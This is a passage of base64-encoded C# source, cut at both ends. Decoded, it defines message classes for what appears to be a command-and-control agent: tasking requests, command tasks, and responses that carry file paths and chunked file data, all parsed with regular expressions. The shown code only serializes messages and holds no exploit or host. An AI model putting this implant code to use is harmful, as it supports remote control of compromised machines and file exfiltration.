c3BvbnNlRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6ICIiezB9IiIsICIidGFza3MiIjogezF9fX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgR2V0VGFza2luZ1Jlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBHZXRUYXNraW5nUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgR2V0VGFza2luZ1Jlc3BvbnNlRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMikgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgR2V0VGFza2luZ1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIHRhc2tzID0gVGFzay5QYXJzZVRhc2tzKHBhcnNlTGlzdFsxXSkNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFBvc3RSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxUYXNrUmVzcG9uc2U+IHJlc3BvbnNlcyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBQb3N0UmVzcG9uc2UoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJlc3BvbnNlcyA9IG5ldyBMaXN0PFRhc2tSZXNwb25zZT4oKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6IiJ7MH0iIiwiInJlc3BvbnNlcyIiOlt7MX1dfX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oUG9zdFJlc3BvbnNlIHBvc3RfcmVzcG9uc2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIHJlc3BvbnNlcyA9ICIiOw0KICAgICAgICAgICAgICAgIGludCBjb3VudCA9IDA7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVGFza1Jlc3BvbnNlIHRhc2tfcmVzcG9uc2UgaW4gcG9zdF9yZXNwb25zZS5yZXNwb25zZXMpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoKGNvdW50ICsgMSkgPT0gcG9zdF9yZXNwb25zZS5yZXNwb25zZXMuQ291bnQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyArPSBUYXNrUmVzcG9uc2UuVG9Kc29uKHRhc2tfcmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzICs9IFRhc2tSZXNwb25zZS5Ub0pzb24odGFza19yZXNwb25zZSkgKyAnLCc7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgKytjb3VudDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuICJ7XCJhY3Rpb25cIjogXCIiICsgcG9zdF9yZXNwb25zZS5hY3Rpb24gKyAiXCIsIFwicmVzcG9uc2VzXCI6IFsiICsgcmVzcG9uc2VzICsgIl19IjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBQb3N0UmVzcG9uc2VSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxSZXNwb25zZT4gcmVzcG9uc2VzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIFBvc3RSZXNwb25zZVJlc3BvbnNlKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXNwb25zZXMgPSBuZXcgTGlzdDxSZXNwb25zZT4oKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUG9zdFJlc3BvbnNlUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJhY3Rpb24iIjogIiJ7MH0iIiwgIiJyZXNwb25zZXMiIjogezF9fX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgUG9zdFJlc3BvbnNlUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFBvc3RSZXNwb25zZVJlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIFBvc3RSZXNwb25zZVJlc3BvbnNlRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMikgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUG9zdFJlc3BvbnNlUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzID0gUmVzcG9uc2UuUGFyc2VSZXNwb25zZXMocGFyc2VMaXN0WzFdKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgVGFzayANCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBjb21tYW5kIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcGFyYW1ldGVycyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGlkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGltZXN0YW1wIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVGFza0Zvcm1hdCA9IEAie3siImNvbW1hbmQiIjogIiJ7MH0iIiwgIiJwYXJhbWV0ZXJzIiI6ICIie3t7MX19fSIiLCAiImlkIiI6ICIiezJ9IiIsICIidGltZXN0YW1wIiI6IHszfX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7M30iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezN9IiwgIig\/J2dyb3VwMycuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMyJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8VGFzaz4gUGFyc2VUYXNrcyhzdHJpbmcgdGFza3NfanNvbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAodGFza3NfanNvbiA9PSAiW10iKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tzX2pzb24gPSB0YXNrc19qc29uLlJlcGxhY2UoIlsiLCBAIiIpLlJlcGxhY2UoIl0iLCBAIiIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBMaXN0PFRhc2s+IHRhc2tzID0gbmV3IExpc3Q8VGFzaz4oKTsNCiAgICAgICAgICAgICAgICBzdHJpbmdbXSB0YXNrc19zcGxpdCA9IHRhc2tzX2pzb24uU3BsaXQobmV3W10geyAifSwiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5SZW1vdmVFbXB0eUVudHJpZXMpOw0KICAgICAgICAgICAgICAgIGludCBjb3VudCA9IDA7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIHRhc2sgaW4gdGFza3Nfc3BsaXQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gbmV3IExpc3Q8c3RyaW5nPiB7IH07DQogICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCArIDEgIT0gdGFza3Nfc3BsaXQuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBUYXNrLlBhcnNlKHRhc2sgKyAifSIsIFRhc2tGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0WzBdID09ICIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBmb3JtYXQgPSBAInt7IiJjb21tYW5kIiI6ICIiezB9IiIsICIicGFyYW1ldGVycyIiOiAiInsxfSIiLCAiImlkIiI6ICIiezJ9IiIsICIidGltZXN0YW1wIiI6IHszfX19IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBUYXNrLlBhcnNlKHRhc2ssIGZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFRhc2suUGFyc2UodGFzayArICJ9IiwgVGFza0Zvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3RbMF0gPT0gIiIpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGZvcm1hdCA9IEAie3siImNvbW1hbmQiIjogIiJ7MH0iIiwgIiJwYXJhbWV0ZXJzIiI6ICIiezF9IiIsICIiaWQiIjogIiJ7Mn0iIiwgIiJ0aW1lc3RhbXAiIjogezN9fX0iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFRhc2suUGFyc2UodGFzaywgZm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNCkgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICBUYXNrIG5ld190YXNrID0gbmV3IFRhc2sNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICBpZCA9IHBhcnNlTGlzdFsyXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcCA9IHBhcnNlTGlzdFszXQ0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICB0YXNrcy5BZGQobmV3X3Rhc2spOw0KICAgICAgICAgICAgICAgICAgICArK2NvdW50Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdGFza3M7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgVGFza1Jlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHVzZXJfb3V0cHV0IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc3RhdHVzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY29tcGxldGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZXJyb3IgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludD8gdG90YWxfY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZnVsbF9wYXRoIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQ\/IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGNodW5rX2RhdGEgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIidGFza19pZCIiOiIiezB9IiIsIiJ1c2VyX291dHB1dCIiOiIiezF9IiIsIiJzdGF0dXMiIjoiInsyfSIiLCIiY29tcGxldGVkIiI6ezN9LCIiZXJyb3IiIjoiIns0fSIiLCIidG90YWxfY2h1bmtzIiI6ezV9LCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOns3fSwiImNodW5rX2RhdGEiIjoiIns4fSIiLCIiZmlsZV9pZCIiOiIiezl9IiJ9fSI7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQxID0gQCJ7eyIidGFza19pZCIiOiIiezB9IiIsIiJ1c2VyX291dHB1dCIiOiIiezF9IiIsIiJzdGF0dXMiIjoiInsyfSIiLCIiY29tcGxldGVkIiI6IiJ7M30iIiwiImVycm9yIiI6IiJ7NH0iIiwiInRvdGFsX2NodW5rcyIiOiIiezV9IiIsIiJmdWxsX3BhdGgiIjoiIns2fSIiLCIiY2h1bmtfbnVtIiI6ezd9LCIiY2h1bmtfZGF0YSIiOiIiezh9IiIsIiJmaWxlX2lkIiI6IiJ7OX0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdDIgPSBAInt7IiJ0YXNrX2lkIiI6IiJ7MH0iIiwiInVzZXJfb3V0cHV0IiI6IiJ7MX0iIiwiInN0YXR1cyIiOiIiezJ9IiIsIiJjb21wbGV0ZWQiIjoiInszfSIiLCIiZXJyb3IiIjoiIns0fSIiLCIidG90YWxfY2h1bmtzIiI6ezV9LCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOiIiezd9IiIsIiJjaHVua19kYXRhIiI6IiJ7OH0iIiwiImZpbGVfaWQiIjoiIns5fSIifX0iOw0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0MyA9IEAie3siInRhc2tfaWQiIjoiInswfSIiLCIidXNlcl9vdXRwdXQiIjoiInsxfSIiLCIic3RhdHVzIiI6IiJ7Mn0iIiwiImNvbXBsZXRlZCIiOiIiezN9IiIsIiJlcnJvciIiOiIiezR9IiIsIiJ0b3RhbF9jaHVua3MiIjoiIns1fSIiLCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOiIiezd9IiIsIiJjaHVua19kYXRhIiI6IiJ7OH0iIiwiImZpbGVfaWQiIjoiIns5fSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oVGFza1Jlc3BvbnNlIHRhc2tfcmVzcG9uc2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDsNCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS51c2VyX291dHB1dCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS51c2VyX291dHB1dCA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5jb21wbGV0ZWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuY29tcGxldGVkID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLmVycm9yID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmVycm9yID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLnN0YXR1cyA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5zdGF0dXMgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIHRvdGFsX2NodW5rczsNCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS50b3RhbF9jaHVua3MgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDE7DQogICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBGb3JtYXQgPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQyOw0KICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSB0YXNrX3Jlc3BvbnNlLnRvdGFsX2NodW5rcy5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5mdWxsX3BhdGggPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuZnVsbF9wYXRoID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZyBjaHVua19udW07DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuY2h1bmtfbnVtID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoRm9ybWF0ICE9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDM7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChGb3JtYXQgIT0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgRm9ybWF0ID0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSB0YXNrX3Jlc3BvbnNlLmNodW5rX251bS5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5jaHVua19kYXRhID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmNodW5rX2RhdGEgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5maWxlX2lkID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBGb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS50YXNrX2lkKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLnVzZXJfb3V0cHV0KSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLnN0YXR1cyksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5jb21wbGV0ZWQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UuZXJyb3IpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRvdGFsX2NodW5rcyksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5mdWxsX3BhdGgpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNodW5rX251bSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5jaHVua19kYXRhKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLmZpbGVfaWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzdGF0dXMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB